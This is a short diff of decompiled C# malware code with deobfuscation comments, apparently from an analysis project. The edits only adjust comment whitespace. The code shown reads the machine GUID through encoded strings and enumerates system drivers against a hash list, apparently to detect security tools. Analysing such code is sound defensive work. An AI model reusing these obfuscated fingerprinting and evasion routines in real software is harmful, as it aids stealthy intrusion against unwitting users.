@@ -122,8 +122,7 @@ private static bool GetOrCreateUserID(out byte[] hash64)
 	}
 	text += domain4;
 	try
-	{
-														//Deobfuscated: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography                             //Deobfuscated: MachineGuid
+	{                                                   //Deobfuscated: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography                           //Deobfuscated: MachineGuid
 		text += RegistryHelper.GetValue(ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
 	}
 	catch
@@ -282,7 +281,7 @@ private static readonly ulong[] configTimeStamps = new ulong[17]
 
 private static bool SearchConfigurations()
 {
-																				//Deobfuscated: Select * From Win32_SystemDriver
+                                                                                //Deobfuscated: Select * From Win32_SystemDriver
 	ManagementObjectSearcher val = new ManagementObjectSearcher(ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA=="));
 	try
 	{
@@ -290,8 +289,7 @@ private static bool SearchConfigurations()
 		try
 		{
 			while (enumerator.MoveNext())
-			{
-																																									//Deobfuscated: PathName
+			{                                                                                                                                                     //Deobfuscated: PathName
 				ulong hash = GetHash(Path.GetFileName(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Properties().get_Item(ZipHelper.Unzip("C0gsyfBLzE0FAA==")).get_Value()
 					.ToString())!.ToLower());
 				if (Array.IndexOf(configTimeStamps, hash) != -1)
